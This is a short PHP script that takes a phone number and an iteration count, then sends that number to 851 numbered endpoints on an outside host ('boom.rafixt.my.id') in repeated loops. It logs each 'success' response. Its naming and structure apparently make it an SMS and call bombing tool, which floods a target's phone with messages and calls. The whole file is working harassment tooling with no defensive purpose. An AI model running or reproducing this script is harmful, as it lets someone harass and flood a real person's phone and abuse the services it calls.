<?php
// Get parameters
$phone = isset($argv[1]) ? $argv[1] : (isset($_GET['phone']) ? $_GET['phone'] : die("Phone number is required!\n"));
$iterations = isset($argv[2]) ? (int)$argv[2] : (isset($_GET['iterations']) ? (int)$_GET['iterations'] : 1);

// Prepare API endpoints for all folders
function prepareEndpoints($phone) {
    $apiConfigs = [
        "https://boom.rafixt.my.id/fapi1/" => 195,
        "https://boom.rafixt.my.id/fapi2/" => 437,
        "https://boom.rafixt.my.id/fapi3/" => 215,
        "https://boom.rafixt.my.id/call/" => 4
    ];

    $allEndpoints = [];
    foreach ($apiConfigs as $baseUrl => $max) {
        for ($i = 1; $i <= $max; $i++) {
            $allEndpoints[] = $baseUrl . "api$i.php?phone=" . urlencode($phone);
        }
    }
    return $allEndpoints;
}

// Function to make a single GET request
function makeRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FAILONERROR, true); // Handle HTTP errors
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [
        'url' => $url,
        'response' => $response,
        'http_code' => $httpCode
    ];
}

// Run the script for the specified number of iterations
for ($run = 1; $run <= $iterations; $run++) {
    echo "Starting iteration $run...\n";

    $apiEndpoints = prepareEndpoints($phone);
    foreach ($apiEndpoints as $endpoint) {
        $result = makeRequest($endpoint);

        // Check if the response contains "success"
        if (stripos($result['response'], "success") !== false) {
            echo "Successful response from: {$result['url']}\n";
        }
    }
}

// Log the success message
file_put_contents("background_success.log", "All {$iterations} iterations completed successfully at " . date("Y-m-d H:i:s") . "\n");
?>
